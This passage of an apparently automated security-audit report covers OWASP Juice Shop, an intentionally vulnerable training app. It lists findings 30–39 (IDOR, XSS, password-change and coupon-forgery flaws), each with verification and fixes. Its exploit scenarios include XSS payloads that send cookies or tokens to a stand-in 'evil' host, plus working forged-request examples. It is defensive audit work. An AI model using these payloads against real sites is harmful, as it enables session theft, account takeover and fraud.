- **B.** `retrieveBasket()` (`routes/basket.ts:15-16`) loads the basket directly from `req.params.id` with no comparison to the caller's session. `isAuthorized()` (`insecurity.ts:48`) is just `expressJwt({ secret: [REDACTED-SECRET] })` — JWT validity only, zero ownership/tenant check. Entry point is network, reachable by any authenticated customer.
- **C/D.** No defence: no allow-list, no `user.bid` comparison, no authz gate. On the contrary, lines 18-21 contain `challengeUtils.solveIf(challenges.basketAccessChallenge, ...)` which *rewards* the case where the accessed `id !== user.bid` — definitive proof this cross-user read is intended and undefended.

This is a real, externally reachable IDOR (a deliberate Juice Shop challenge, but genuinely exploitable and security-impacting). A low-privilege authenticated user reads any other user's basket contents. Confidentiality impact is high; the read path doesn't itself modify data (the checkout/order paths are separate sinks). Scope same-component (app-level authz logic, no boundary jump in the engine sense).

### 31. [MEDIUM] GET /api/Feedbacks lists all feedback without authentication
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `server.ts:327-327`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
Feedback is exposed via finale.resource (autoModels 'Feedback', server.ts:448). Only /api/Feedbacks/:id is guarded with isAuthorized (server.ts:327) and PUT /:id with denyAll (server.ts:399); POST has captcha checks. The collection GET (finale list) at /api/Feedbacks has no guard, so anyone can read all rows including UserId associations.

#### Impact
Any unauthenticated user can enumerate every feedback record, including comments and the associated UserId, leaking which users submitted which feedback. This is an IDOR-style bulk read of other users' data.

#### Exploit scenario
Attacker requests GET /api/Feedbacks with no auth; the response returns every feedback row with UserId, allowing correlation of comments to user accounts.

#### Preconditions
- None — anonymous request

```
app.use('/api/Feedbacks/:id', security.isAuthorized()) // only :id guarded; list open
```

#### How to fix
Restrict the Feedbacks collection read (e.g. app.get('/api/Feedbacks', security.isAuthorized()) or strip UserId via excludeAttributes for the Feedback resource at server.ts:448).

**Exploitability:** Unauthenticated feedback collection listing with UserId associations; low-sensitivity bulk read. CVSS 5.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Collection GET /api/Feedbacks is unguarded (only /:id is isAuthorized), finale excludes nothing, so UserId leaks to anonymous users

I've verified the key facts. Let me confirm the middleware semantics and that no list-level guard exists elsewhere.

Findings:
- **Line 327**: `app.use('/api/Feedbacks/:id', security.isAuthorized())` — Express `app.use` with `/api/Feedbacks/:id` only matches paths containing the `:id` segment. The collection path `/api/Feedbacks` (no id) is **not** matched, so the list GET is unguarded.
- **Line 448**: `{ name: 'Feedback', exclude: [], model: FeedbackModel }` — `excludeAttributes` is empty, so finale returns **all** columns including `UserId`.
- **Line 462-468**: `finale.resource` exposes both `/api/Feedbacks` (list) and `/api/Feedbacks/:id`. No Feedback-specific `list.fetch.after` hook strips fields (only Challenge/SecurityQuestion/Hint/Product/User have hooks).
- **Model** (`models/feedback.ts:20`): `UserId` is a returned attribute; only `comment` is HTML-sanitized on write. Nothing redacts `UserId` on read.
- Other Feedback routes (368-372 POST captcha/forgery checks, 399 PUT denyAll) don't cover the collection GET.

So an anonymous network request to `GET /api/Feedbacks` returns every row including `UserId`, enabling correlation of feedback comments to user accounts. External unauthenticated entry point confirmed (finale auto-CRUD, UNAUTH-REACHABLE); no upstream auth gate, allow-list, or attribute exclusion closes the path.

This is a genuine but limited info-disclosure: `UserId` (a foreign-key integer) leaks the author of each feedback, allowing de-anonymization/correlation. No integrity or availability impact, no full PII dump (passwords/emails aren't in this table). Confidentiality impact is Low. (It is also an intentional Juice Shop weakness, but it is a real, reachable data exposure — not OOS noise.)

### 32. [MEDIUM] Reflected DOM XSS via search query bypassing Angular sanitizer
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `frontend/src/app/search-result/search-result.component.ts:155-163`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
filterTable() reads the raw search term from the route query parameter `q` (this.route.snapshot.queryParams.q), trims it, and assigns this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam). The template renders it with `<span id="searchValue" [innerHTML]="searchValue"></span>` (search-result.component.html:10). bypassSecurityTrustHtml explicitly disables Angular's contextual auto-escaping, so any markup in `q` is injected verbatim into the DOM.

#### Impact
Any anonymous visitor who follows a crafted /search?q= link executes attacker JavaScript in the victim's session, allowing token/cookie theft and account takeover. No authentication is required to trigger it.

#### Exploit scenario
Attacker sends a victim the link https://host/#/search?q=<img src=x onerror=alert(document.cookie)>. When the victim opens it, filterTable() marks the value as trusted HTML and renders it via [innerHTML], firing the onerror handler and running arbitrary JS in the victim's authenticated context.

#### Preconditions
- Victim opens an attacker-supplied search URL

```
let queryParam: string = this.route.snapshot.queryParams.q
...
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)
```

#### How to fix
Do not call bypassSecurityTrustHtml on user-controlled query input. Bind the search term with normal interpolation ({{ searchValue }}) or escape/sanitize it; remove the bypass at search-result.component.ts:163.

**Exploitability:** Reflected DOM XSS via bypassSecurityTrustHtml on q; needs victim to open crafted link. CVSS 6.1 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — attacker-controlled `q` param flows verbatim through `bypassSecurityTrustHtml` into `[innerHTML]` with no upstream control; externally reachable DOM XSS.

Confirmed against source. The reported code is exact:

- **Line 156**: `let queryParam: string = this.route.snapshot.queryParams.q` — raw read of the URL query parameter `q`, no validation.
- **Line 158**: only `.trim()` applied — not a sanitizer.
- **Line 163**: `this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)` — explicitly disables Angular's contextual auto-escaping.
- **HTML line 10**: `<span id="searchValue" [innerHTML]="searchValue">` — renders the trusted-HTML blob directly into the DOM.

**Entry point (B):** The route query param `q` is fully attacker-controlled and reachable unauthenticated — a victim merely opening `https://host/#/search?q=<img src=x onerror=...>` triggers `filterTable()` on every router event (subscribed at line 111-113). External, lower-privileged entry point confirmed.

**Attempts to kill it (C/D):** 
- No allow-list, length cap, or type constraint — only `.trim()` and `.toLowerCase()` (which does not neutralize HTML; `<IMG>` lowercases fine and `onerror` survives).
- `bypassSecurityTrustHtml` is the *opposite* of a defence — it deliberately defeats Angular's built-in sanitizer that would otherwise strip the markup.
- The `verifyLocalXssChallenge` socket emit (line 160) is challenge telemetry, not a guard.
- Layer check: XSS is a client-side bug class raised against client-side code → correct layer, not the "wrong layer" exclusion.

This is OWASP Juice Shop's intentional DOM-based XSS challenge, but per the decision rule it is still a genuine, externally-reachable, undefended sink with real impact (script execution in the victim's authenticated session). Note `[innerHTML]` will not auto-fire `<script>`, but `<img onerror>`/`<svg onload>` vectors execute, so impact stands.

CVSS: reflected/DOM XSS — network, trivial, no privileges, victim must click (UI:R), scope changes into the browser/user context (S:C), limited confidentiality/integrity impact, no availability impact.

### 33. [MEDIUM] Stored XSS via product description rendered as trusted HTML
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `frontend/src/app/search-result/search-result.component.ts:125-129`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.80 (1 run agreed)

#### Description
trustProductDescription() iterates the product list returned by productService.search('') and replaces each description with sanitizer.bypassSecurityTrustHtml(description). That value is bound via [innerHtml] in challenge-card/product list components. Product descriptions originate from the server-side Products table, which is reachable through the auto-CRUD /api/Products endpoints; any markup persisted there is rendered without escaping for all viewers.

#### Impact
An attacker who can influence a product description (e.g. via the writable /api/Products CRUD surface) stores HTML/JS that executes in every visitor's browser on the search results page, enabling session theft against all users.

#### Exploit scenario
An attacker creates/updates a product with description '<img src=x onerror=fetch("//evil/?c="+document.cookie)>'. Every user who loads the search results page has the payload rendered through bypassSecurityTrustHtml and the script runs in their session.

#### Preconditions
- Attacker can write a product description via the product CRUD API
- Victim views the product/search listing

```
trustProductDescription (tableData: any[]) {
  for (let i = 0; i < tableData.length; i++) {
    tableData[i].description = this.sanitizer.bypassSecurityTrustHtml(tableData[i].description)
  }
}
```

#### How to fix
Remove trustProductDescription's bypassSecurityTrustHtml call (search-result.component.ts:127); render descriptions with default Angular escaping or sanitize server-side before storage.

**Exploitability:** Stored XSS via product description trusted-HTML binding; requires write to Products (e.g. via [22]) and victim view. CVSS 5.4 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — bypassSecurityTrustHtml on server-controlled product description rendered via [innerHTML]; PUT /api/Products/:id is unguarded, giving a low-priv attacker a persisted XSS against all viewers

I have enough to confirm. Let me verify the data path once more: `trustProductDescription(products)` mutates `products[i].description` to SafeHtml (line 82, 127), then those same objects are stored in `tableData` (line 81) and copied into `dataTable` with the SafeHtml description (line 90). `showDetail(item)` passes the entry to ProductDetailsComponent, whose template binds `[innerHTML]="data.productData.description"` (line 13). The sink is confirmed reachable from rendered UI.

Write path: `app.post('/api/Products')` requires auth, `delete` is denied, but **PUT `/api/Products/:id` has no guard** — finale-rest exposes update openly, so any user can persist arbitrary HTML into a product description. `bypassSecurityTrustHtml` then disables Angular's sanitizer, so an `<img onerror>`/`<iframe>` payload executes for every viewer.

This is the canonical Juice Shop "API-only / RESTful XSS" planted challenge — a genuine, reachable stored XSS, not a scanner misread.

- Entry point: unauthenticated/low-priv PUT to auto-CRUD `/api/Products/:id` (external, network).
- No defence: sanitizer explicitly bypassed; no allow-list, encoding, or length/type constraint on description; update endpoint ungated.
- Impact: script execution in every viewer's authenticated session (cookie/token theft, actions on behalf of victim).

Note `<script>` won't fire via innerHTML, but the cited `<img onerror>` payload does — impact stands.

### 34. [MEDIUM] Server data-export payload written raw into a new window via document.write
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `frontend/src/app/data-export/data-export.component.ts:64-70`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
save() takes data.userData from the /rest/user/data-export response and calls window.open(...)?.document.write(this.userData). The exported data includes user-supplied fields (memories captions, orders, reviews). document.write of attacker-influenced strings with no escaping renders any embedded markup/script as live HTML in the opened document.

#### Impact
The data-export response body (userData) is written unescaped into a freshly opened window, so any HTML/script embedded in the exported user-controlled fields executes JavaScript in the application origin.

#### Exploit scenario
A user stores a memory caption or review containing '<script>...</script>'; when they request a data export, the server includes that field and the component writes it via document.write into a new window, executing the script in the app context.

#### Preconditions
- Attacker-controlled field is persisted and included in the export
- Victim performs a data export

```
this.userData = data.userData
window.open('', '_blank', 'width=500')?.document.write(this.userData)
```

#### How to fix
Do not use document.write with server data. Render the export through a sanitized/escaped DOM API or download it as a file; fix data-export.component.ts:68.

**Exploitability:** document.write of export payload; self-XSS-ish, needs user-influenced fields and interaction. CVSS 5.4 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — server-returned, user-influenced export data (memory captions/reviews) is written raw via document.write; JSON.stringify does not escape HTML, so embedded markup executes in the app origin. Authenticated, network-reachable, no encoding defence.

I've fully traced the chain. Confirmed findings:

**A. The sink (verified):** Line 67-68 of `data-export.component.ts`: `this.userData = data.userData` then `window.open('', '_blank', 'width=500')?.document.write(this.userData)`. This is exactly as the scanner reported — raw `document.write` of server response with no escaping/sanitization.

**B. Data source (verified):** `routes/dataExport.ts` line 105 returns `JSON.stringify(userData, null, 2)` where `userData` embeds `memory.caption`, `review.message`, `order` fields. Captions come from `req.body.caption` (`routes/memory.ts:10`) — user-supplied and persisted.

**C. Defence probe:**
- `JSON.stringify` does **not** escape HTML metacharacters (`<`, `>`, `/`). A caption of `<script>...</script>` survives serialization verbatim, so `document.write` parses it as live HTML and executes the script in the opened document (which inherits the app origin). No encoding defence exists.
- The endpoint requires `security.authenticatedUsers.get(...)` — an authenticated user (PR:L), reachable over the network.
- Correct layer: XSS is a client-side bug class raised against client code — appropriate, not a wrong-layer finding.

**D. Caveat:** orders/reviews are filtered by the requesting user's own email, and the frontend doesn't send a `UserId`, so the most direct path is largely self-targeted. However, memory captions are attacker-authorable content (photo-wall), the sink is genuinely unescaped, and script executes in the app's origin (can reach the victim's JWT in localStorage). This is the intentional Juice Shop data-export XSS challenge — a real, reachable injection sink with no neutralising control.

The scanner correctly identified the sink, class, and file. Input reaches the sink unsanitized from an external (authenticated) entry point, and no control closes the path.

### 35. [MEDIUM] Password change skips current-password check when omitted
**Class:** CWE-620
**CWE:** CWE-620 - https://cwe.mitre.org/data/definitions/620.html
**File:** `routes/changePassword.ts:36-48`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.85 (1 run agreed)

#### Description
currentPassword/newPassword/repeatPassword come from the query string (lines 11-14). The verification on line 36 is `if (currentPassword && security.hash(currentPassword) !== loggedInUser.data.password)`. Because the guard is gated on `currentPassword` being truthy, omitting the `current` query parameter entirely skips the comparison and proceeds to `user.update({ password: ... })` on line 48. The new password is accepted with no proof of the old one.

#### Impact
The current-password verification is short-circuited whenever the `current` parameter is absent or empty, so any party able to present a valid session token can set a new password without proving knowledge of the existing one.

#### Exploit scenario
With a captured/forwarded Bearer token, the attacker issues GET /rest/user/change-password?new=Pwned1&repeat=Pwned1 (no `current` parameter). The truthiness gate on line 36 is false, the check is skipped, and the victim's password is overwritten.

#### Preconditions
- A valid session token for the target account is presented in the Authorization header

```
if (currentPassword && security.hash(currentPassword) !== loggedInUser.data.password) {
  res.status(401).send(res.__('Current password is not correct.'))
  return
}
...
await user.update({ password: ... })
```

#### How to fix
Require and verify the current password unconditionally: change line 36 to reject when currentPassword is missing OR does not hash-match loggedInUser.data.password before reaching the update on line 48.

**Exploitability:** Password change skips current-password verification when param omitted; only affects own session unless chained with CSRF/XSS. CVSS 6.5 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — current-password check on line 36 is gated on `currentPassword` truthiness; omitting the `current` query param skips re-auth and overwrites the password at line 48 with only a valid token.

I've verified the finding against the actual source.

**A. What the code does (lines 36–48):** Confirmed exactly as reported. Line 36 reads `if (currentPassword && security.hash(currentPassword) !== loggedInUser.data.password)`. The check is short-circuited when `currentPassword` is falsy. `currentPassword` comes from `query.current` (line 11). If `current` is omitted, the guard is skipped and `user.update({ password: [REDACTED-SECRET] })` runs (line 48).

**B. Call chain to entry point:** `server.ts:550` registers `app.get('/rest/user/change-password', changePassword())` — a network-reachable GET route. No middleware sits in front; the handler does its own token resolution.

**C. Attempting to kill it:**
- Lines 16–22: only validate that `new` is non-empty and `new === repeat`. No constraint on `current`.
- Lines 24–34: require a *valid* Bearer token (`authenticatedUsers.get(token)` must resolve). So this is not unauthenticated — a valid session token is required (PR:L).
- Line 36: the only current-password defence — and it is precisely the bypassable gate. There is no alternate enforcement.
- Line 51 even references `!currentPassword` as the success condition for the "change Bender's password" challenge, confirming the omit-`current` path is intentionally reachable.

**D. Probing the defence:** The truthiness gate covers the only route into the sink, and is trivially defeated by simply not sending `current`. No edge case needed.

**Verdict reasoning:** Reaches an external (network) entry point; the current-password re-authentication control is fully bypassable by omitting the parameter; impact is a real broken-authentication / missing re-auth flaw allowing an unverified password overwrite. This is an intentional Juice Shop challenge, but per the decision rule it is still a genuine logic flaw with a demonstrable path. Scoped as PR:L (a valid session token is required — classic CSRF via cookie does not apply since the token is in the Authorization header), integrity impact High (victim's credential overwritten), no confidentiality leak.

### 36. [MEDIUM] Basket checkout lacks ownership check (BOLA on basket id)
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `routes/order.ts:32-46`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)

#### Description
placeOrder() reads the basket identifier directly from req.params.id (line 32) and loads the basket with BasketModel.findOne({ where: { id } }) (line 33) without ever comparing the basket's owning UserId to the authenticated caller's identity. The route is mounted under /rest/basket which only enforces security.isAuthorized()/appendUserId() (server.ts:322) — i.e. the caller must be logged in, but there is no per-object authorization. Because basket ids are sequential integers, an attacker logged in as user A can iterate ids and POST/PUT the checkout for user B's basket. On the fileWriter 'finish' callback (line 46) BasketItemModel.destroy({ where: { BasketId: id } }) deletes ALL of the targeted basket's items, and lines 67-99 mutate product Quantity rows based on the victim's basket contents.

#### Impact
Any authenticated user can check out and clear the basket of any other user by supplying that user's basket id in the URL. The attacker triggers an order against the victim's basket, generates a PDF order receipt containing victim/order data, and destroys all of the victim's basket items, causing data loss and order-state corruption for arbitrary accounts.

#### Exploit scenario
Attacker authenticates as an ordinary user, then sends the checkout request to /rest/basket/2/checkout (basket id 2 belonging to another customer). The handler loads basket 2, builds an order PDF, decrements product stock for items in that basket, and on completion runs BasketItemModel.destroy({ where: { BasketId: 2 } }), wiping the victim's basket. Repeating across ids lets the attacker disrupt every user's basket.

#### Preconditions
- Attacker has any authenticated (low-privilege) user session
- Attacker can guess/enumerate target basket ids (sequential integers)

```
const id = req.params.id
BasketModel.findOne({ where: { id }, include: [...] })
  .then(async (basket) => {
    if (basket != null) {
      ...
      await BasketItemModel.destroy({ where: { BasketId: id } })
```

#### How to fix
Authorization must verify the basket's owner equals the caller before any read/mutation. In placeOrder() at routes/order.ts:33, add a constraint such as where: { id, UserId: <authenticated user id from security.authenticatedUsers.from(req)> } and reject (404/403) if no row matches, rather than loading the basket by id alone.

**Exploitability:** Checkout BOLA on sequential basket ids; deletes/mutates victim basket items, integrity impact. CVSS 6.5 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — authenticated user can checkout/wipe any basket by enumerating sequential ids; only authn, no per-object authz

Confirmed via source. Findings:

**A. Sink** (`routes/order.ts:32-46`): `placeOrder()` reads `const id = req.params.id`, loads `BasketModel.findOne({ where: { id }, ... })` with no `UserId` comparison, and on the PDF `finish` callback runs `BasketItemModel.destroy({ where: { BasketId: id } })` (line 46) plus decrements `QuantityModel` stock (lines 69-72) for whatever basket id was supplied.

**B. Entry point**: `server.ts:557` — `app.post('/rest/basket/:id/checkout', placeOrder())`. Network-reachable POST. The only guard on the path is `app.use('/rest/basket/:id', security.isAuthorized())` (server.ts:365).

**C. Defences probed**:
- `isAuthorized()` (`insecurity.ts:48`) = `expressJwt({ secret: [REDACTED-SECRET] })` — validates a JWT only. It establishes *authentication*, not per-object *authorization*. No UserId/basket-owner check anywhere in the handler.
- `appendUserId()` only runs on `/rest/basket` (server.ts:322), not on the `:id/checkout` route, and even where it runs it only stamps `req.body.UserId` — never compared against the basket's owner.
- The sibling `retrieveBasket()` (`basket.ts:18-21`) explicitly contains the `basketAccessChallenge` logic confirming Juice Shop intentionally ships cross-user basket access (BOLA) here — basket ids are sequential integers, fully enumerable.
- No allow-list, length/type constraint, feature flag, or test-only gating closes the path.

**D. Coverage**: every route into the sink shares the same weak guard; nothing restricts `id` to the caller's own basket. An authenticated low-priv user can POST `/rest/basket/<otherId>/checkout` and the handler destroys that basket's items and mutates global product stock.

This is a real, externally reachable BOLA (the intentional Juice Shop basket-access challenge). Impact is integrity: deletion of a victim's basket items and modification of shared product `Quantity` rows. The handler returns only an order-confirmation id, so no victim data is read back to the attacker (C:N). Scanner read the code correctly.

### 37. [MEDIUM] Coupon discount forged from client-supplied base64 couponData
**Class:** CWE-807
**CWE:** CWE-807 - https://cwe.mitre.org/data/definitions/807.html
**File:** `routes/order.ts:184-194`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
calculateApplicableDiscount falls back to req.body.couponData, which is base64-decoded and split on '-' into a code and a numeric date. The code is looked up in the hard-coded `campaigns` table and validated only by a loose `couponDate == campaign.validOn` comparison. Both the campaign codes (e.g. WMNSDY2019) and their validOn timestamps are static, public, embedded constants. There is no HMAC/signature on this fallback path (unlike security.discountFromCoupon), so the attacker simply submits base64('WMNSDY2019-1551999600000') to obtain the 75% discount which is then subtracted from totalPrice and persisted.

#### Impact
Any authenticated buyer can grant themselves an arbitrary promotional discount (up to 75%) on an order by sending a crafted couponData field, because the server trusts client-supplied campaign code and date with no integrity-protected token.

#### Exploit scenario
Attacker logged in as any user POSTs an order with couponData = btoa('WMNSDY2019-' + new Date('Mar 08, 2019').getTime()). The server matches the campaign, returns discount 75, and reduces totalPrice by 75% before charging the wallet. Repeating across orders yields unlimited fraudulent discounts.

#### Preconditions
- Valid authenticated session
- Knowledge of the publicly-static campaign code and its validOn timestamp

```
} else if (req.body.couponData) {
    const couponData = Buffer.from(req.body.couponData, 'base64').toString().split('-')
    const couponCode = couponData[0]
    const couponDate = Number(couponData[1])
    const campaign = campaigns[couponCode as keyof typeof campaigns]
    if (campaign && couponDate == campaign.validOn) {
      ...
      return campaign.discount
    }
  }
```

#### How to fix
Discounts must be derived only from a server-issued, integrity-protected coupon (signed/HMAC token via security.discountFromCoupon). Remove the unauthenticated req.body.couponData fallback at lines 184-194 or require a cryptographically verified token rather than a plaintext code+date.

**Exploitability:** Forged coupon from public static campaign constants; financial integrity, low value. CVSS 4.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — client-supplied couponData validated only against public static constants on an unsigned fallback path; reachable by any authenticated user, yields a real 75% discount applied to the charged total

I've verified the finding thoroughly.

**A. The code (lines 184–194):** Confirmed exact match. The `couponData` fallback base64-decodes `req.body.couponData`, splits on `-`, looks up the code in the static `campaigns` table (lines 198–208), and applies the discount if `couponDate == campaign.validOn`. The `validOn` values are hard-coded, publicly-known timestamps, and there is no HMAC/signature on this branch.

**B. Call chain to external entry point:** `placeOrder()` → `POST /rest/basket/:id/checkout` (server.ts:557). Reachable over the network. Gated only by `security.isAuthorized()` (server.ts:322/365), i.e. any authenticated user.

**C/D. Defenses?**
- The primary path `discountFromCoupon` (insecurity.ts:98) does enforce a z85-decode + current-month format check — but the `else if` fallback **bypasses** that entirely. The two paths are independent; the signed path doesn't protect the fallback.
- The only "validation" on the fallback is `couponDate == campaign.validOn` against a **public static constant**. The attacker supplies both halves of the comparison, so it's trivially satisfiable with `base64('WMNSDY2019-1551999600000')`.
- No length/type guard, no auth beyond a standard session, no feature flag. The discount (75%) is then subtracted from `totalPrice` (line 108) and the reduced amount is charged to the wallet (line 141) and persisted (`promotionalAmount`, line 156).

**Impact:** Authenticated user pays a fraudulently-reduced price; financial/integrity impact, bounded by the known campaign discounts (max 75%). This is the intentional Juice Shop "Manipulate Clock / forged coupon" logic flaw — a genuine, reachable, undefended vulnerability, not a mis-read sink or dead code.

The input is client-controlled, crosses a real trust boundary (network → server), and no upstream control closes it. Impact is real (price manipulation), so it clears the decision rule.

### 38. [MEDIUM] Stored XSS via feedback comment bypassing Angular sanitizer
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `frontend/src/app/about/about.component.ts:110-124`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
feedbackService.find() returns feedback objects whose `comment` field is supplied by users through the feedback submission API. The component interpolates that raw comment into an HTML string and then calls this.sanitizer.bypassSecurityTrustHtml() on it, explicitly disabling Angular's contextual escaping. The resulting SafeHtml is placed in gallery item.args and rendered with [innerHTML]="item?.args" in about.component.html line 48, so any markup/script in the comment is injected into the DOM.

#### Impact
An attacker who submits a crafted product/feedback comment can store HTML/JS that executes in the browser of every visitor to the About page, enabling session-token theft, account takeover, or arbitrary actions on behalf of the victim.

#### Exploit scenario
An attacker submits feedback with comment `<img src=x onerror="fetch('//evil/c?t='+localStorage.token)">`. When any user opens the About page slideshow, bypassSecurityTrustHtml marks it trusted and [innerHTML] renders it, firing the onerror handler and exfiltrating the victim's JWT.

#### Preconditions
- Attacker can submit a feedback comment (anonymous or authenticated feedback endpoint)
- Victim visits the About page where feedbacks are rendered

```
feedbacks[i].comment = `<figcaption>...${feedbacks[i].comment}...(${this.stars[feedbacks[i].rating]})</figcaption>`
feedbacks[i].comment = this.sanitizer.bypassSecurityTrustHtml(feedbacks[i].comment)
this.galleryRef.addImage({ src: ..., args: feedbacks[i].comment })
```

#### How to fix
Do not call bypassSecurityTrustHtml on user-derived content. Build the figcaption with safe DOM/text binding (use {{ }} interpolation for the comment and only trust the static star markup), or sanitize the comment with DomSanitizer.sanitize(SecurityContext.HTML, ...) before composing the HTML at about.component.ts:116.

**Exploitability:** Unauthenticated stored XSS via feedback comment; fuels admin-panel XSS chain. CVSS 6.1 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — bypassSecurityTrustHtml renders user feedback reachable via anonymous POST /api/Feedbacks; server sanitizer (sanitizeHtml) has a known single-pass bypass when the default-enabled persisted-XSS challenge is active, so the path isn't fully closed (scanner's exact <img onerror> payload is wrong, but the class/sink are correct).

**Analysis**

**A. The sink (confirmed).** `about.component.ts` lines 113–123 build an HTML string interpolating `feedbacks[i].comment`, wrap it in `bypassSecurityTrustHtml()`, and pass it as `args`. `about.component.html` line 48 renders it via `[innerHTML]="item?.args"`. Sink, class, and file all match the scanner's claim.

**B. Call chain to entry point.** `feedbackService.find()` → `GET /api/Feedbacks`. Comments originate from `POST /api/Feedbacks` (server.ts:368–372). That route is gated only by a captcha/forged-feedback verifier, and feedback can be submitted with `UserId: null` (anonymous). So the data reaches the sink from an externally reachable, effectively unauthenticated entry point. ✔ external entry point exists.

**C. Defenses.** The real defense is server-side, in `models/feedback.ts` — the `comment` setter sanitizes on write:
- Challenge **disabled** → `sanitizeSecure()` recursively re-sanitizes until the string is stable, which fully closes the path.
- Challenge **enabled** (`persistedXssFeedbackChallenge`, on by default in Juice Shop) → only `sanitizeHtml()` (single pass, old `sanitize-html`), which has the known bypass `<iframe src="javascript:alert(\`xss\`)">`. The challenge's own `solveIf` confirms this payload survives storage.

**D. Probing the defense.** The scanner's *specific* payload (`<img src=x onerror=...>`) would actually be stripped by `sanitize-html` (img/onerror not allowed). So that exploit detail is inaccurate. However, the sanitizer is *not* a complete defense in the default configuration — a known mutation/single-pass-bypass payload reaches storage and is then rendered through the explicitly-bypassed Angular sanitizer. The path is therefore not fully closed.

**Conclusion.** This is the deliberate persisted/stored XSS challenge in Juice Shop. Right sink, right class, right file; the exploit payload is slightly wrong but the vulnerability is real, intentional, and reachable from an external low-privilege entry point with no defense that fully closes the path. Impact = JS execution in victims' browsers (token theft) — real. Verdict stands as a true positive.

Severity: stored XSS, network-reachable, no privileges, victim must view the About page, executes in victim browser context (scope change), limited confidentiality/integrity impact.

### 39. [MEDIUM] Stored XSS via user email rendered with bypassSecurityTrustHtml
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `frontend/src/app/administration/administration.component.ts:51-62`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
findAllUsers() wraps user.email in a span and calls bypassSecurityTrustHtml, disabling escaping on the attacker-controlled email. The template binds it with [innerHTML]="user.email" at administration.component.html:23 and :102, so an email containing markup is injected into the admin DOM unescaped.

#### Impact
An attacker who registers an account with an HTML/script payload in the email field can execute arbitrary JavaScript in the administrator's browser when the admin views the user list, leading to admin account compromise.

